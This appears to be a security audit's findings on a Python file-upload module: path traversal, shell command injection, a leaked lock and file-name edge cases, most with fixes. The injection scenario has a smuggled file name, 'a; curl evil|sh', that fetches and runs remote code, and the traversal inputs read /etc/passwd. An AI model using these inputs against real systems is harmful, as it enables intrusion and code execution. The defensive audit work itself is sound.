findings.description: filename from the request URL is joined to UPLOAD_DIR without sanitization. os.path.join discards the base if filename is absolute, and '..' segments escape the directory.
findings.scenario: GET with filename '../../../etc/passwd' or '/etc/passwd' returns that file's contents.
findings.fix: filename = os.path.basename(filename), or resolve with realpath and verify it starts with UPLOAD_DIR + os.sep.

findings.description: path is interpolated into a shell command string with shell=True, so shell metacharacters in it are executed.
findings.scenario: An uploaded file named 'a; curl evil|sh' (or a path containing $(...)) passed to virus_scan runs arbitrary commands.

findings.description: The lock is acquired and released manually. If open() or f.write() raises (disk full, missing directory, permission error), release() is never called and the lock stays held.
findings.scenario: One failed write (e.g. ENOSPC) leaves _write_lock held forever, and every later save_upload call blocks permanently.

findings.description: os.path.basename(name) can return an empty string (name ending in '/') or '..', so the target becomes UPLOAD_DIR itself or its parent, and open() fails or targets an unintended path.
findings.scenario: save_upload('foo/', data) gives safe == '' and open() on the directory raises IsADirectoryError, which with the manual lock also leaks the lock.
findings.fix: Reject empty, '.' and '..' names after basename.
